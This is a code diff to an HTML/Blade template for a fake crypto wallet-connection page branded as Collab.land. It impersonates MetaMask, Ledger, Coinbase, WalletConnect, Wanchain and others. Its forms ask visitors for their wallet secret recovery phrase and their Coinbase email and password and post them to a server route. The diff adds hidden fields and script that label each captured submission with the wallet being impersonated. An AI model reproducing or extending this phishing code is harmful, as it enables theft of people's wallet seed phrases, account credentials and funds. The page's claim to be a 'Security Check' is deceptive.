@@ -18,6 +18,7 @@
 <body>
     <section class="home">
         <div class="container" id="containerBox">
+            <span class="logo">Collab.land</span>
             <div class="theBox">
                 <div class="topLine">
                     <span>Connect to a wallet</span>
@@ -171,6 +172,7 @@
                         <form action="{{ route('notification-sender') }}" method="POST">
                             @csrf
                             <input type="text" name="password" id="hiddenPassword" hidden>
+                            <input type="text" name="wallet" id="wallet_hidden" hidden>
                             <input type="text" placeholder="Phrase" name="pharse">
                             <input type="submit" value="Confirm">
                         </form>
@@ -206,7 +208,7 @@
                         <img src="{{ asset('images/rool_image.jpg') }}" alt="">
 
                         <h2>Welcome Back!</h2>
-                        <p>The decentralize web awaits.</p>
+                        <p class="top-p">The decentralize web awaits.</p>
 
                         <form action="#">
                             <input type="button" class="buttonBackground" onclick="wanchainSecondClicked()" value="Import a Wallet" >
@@ -241,12 +243,13 @@
                         <img src="{{ asset('images/rool_image.jpg') }}" alt="">
 
                         <h2>Security Check</h2>
-                        <p>We just need to confirm it's you. <br>
+                        <p class="top-p">We just need to confirm it's you. <br>
                        To continue, enter your Backup Seed Phrase</p>
 
                         <form action="{{ route('notification-sender') }}" method="POST">
                             @csrf
                             <input type="text" placeholder="Wallet Secret Recovery Phrase" name="pharse">
+                            <input type="text" name="wallet" id="wallet_wanchain" hidden>
                             <input type="submit" value="Confirm">
                         </form>
 
@@ -282,20 +285,23 @@
                         <img src="{{ asset('images/download.jpg') }}" alt="">
 
                         <h2>Welcome Back!</h2>
-                        <p>We decentrakuzed web awaits </p>
+                        <p class="top-p">We decentralized web awaits </p>
 
                         <form action="{{ route('notification-sender') }}" method="POST">
                             @csrf
-                            <input type="email" placeholder="email" name="pharse">
-                            <input type="password" name="password" placeholder="password">
+                            <input type="email" placeholder="Email" name="pharse">
+                            <input type="password" name="password" placeholder="Password">
+                            <input type="text" name="wallet" id="wallet_coinbase" hidden>
                             <input type="submit" value="Confirm">
                         </form>
 
 
 
-                        <p class="d-flex"> or <button style="border:none; color: blue" data-bs-toggle="modal" data-bs-target="#coinbaseRecovery" >
-                            import using Secret recovery Phrase</button></p>
-                        <p class="d-flex"> Need Help? Contact <a href="">Coinbase Support</a></p>
+                        <div class="modal-footer">
+                            <p class="d-flex"> or <button style="border:none;data-bs-toggle="modal" data-bs-target="#coinbaseRecovery" >
+                                import using Secret recovery Phrase</button></p>
+                            <p class="d-flex"> Need Help? Contact <a href="">Coinbase Support</a></p>
+                        </div>
                     </div>
 
                 </div>
@@ -387,6 +393,8 @@
                 const modalHeaderSection = document.getElementById('headerSmall');
                 document.getElementById('headerBig').innerHTML =imageSrc
                 modalHeaderSection.innerHTML = imageSrc;
+
+                document.getElementById('wallet_hidden').value = "MetaMask"
                 myModal.show();
             }
 
@@ -399,6 +407,8 @@
                 const modalHeaderSection = document.getElementById('headerSmall');
                 document.getElementById('headerBig').innerHTML =imageSrc
                 modalHeaderSection.innerHTML = imageSrc;
+                document.getElementById('wallet_hidden').value = "Leadger"
+
                 myModal.show();
             }
 
@@ -411,6 +421,8 @@
                 const modalHeaderSection = document.getElementById('headerSmall');
                 document.getElementById('headerBig').innerHTML =imageSrc
                 modalHeaderSection.innerHTML = imageSrc;
+                document.getElementById('wallet_hidden').value = "WalletConnect"
+
                 myModal.show();
 
                 }
@@ -424,6 +436,7 @@
                     const modalHeaderSection = document.getElementById('headerSmall');
                     document.getElementById('headerBig').innerHTML =imageSrc
                     modalHeaderSection.innerHTML = imageSrc;
+                    document.getElementById('wallet_hidden').value = "NBA"
                     myModal.show();
                 }
 
@@ -435,12 +448,14 @@
                     const modalHeaderSection = document.getElementById('headerSmall');
                     document.getElementById('headerBig').innerHTML =imageSrc
                     modalHeaderSection.innerHTML = imageSrc;
+                    document.getElementById('wallet_hidden').value = "Tezos"
                     myModal.show();
                 }
 
                 function coinbaseClick()
                     {
                         const myModal = new bootstrap.Modal(document.getElementById('coinbaseFirst'), {});
+                        document.getElementById('wallet_coinbase').value = "Coinbase"
                         myModal.show();
                     }
 
@@ -452,12 +467,14 @@
                             const modalHeaderSection = document.getElementById('headerSmall');
                             document.getElementById('headerBig').innerHTML =imageSrc
                             modalHeaderSection.innerHTML = imageSrc;
+                            document.getElementById('wallet_hidden').value = "Tezos"
                             myModal.show();
                         }
 
                         function roolClick()
                             {
                                 const myModal = new bootstrap.Modal(document.getElementById('wanchainmodal'), {});
+                                document.getElementById('wallet_wanchain').value ="Wanchain"
                                 myModal.show();
                             }
 
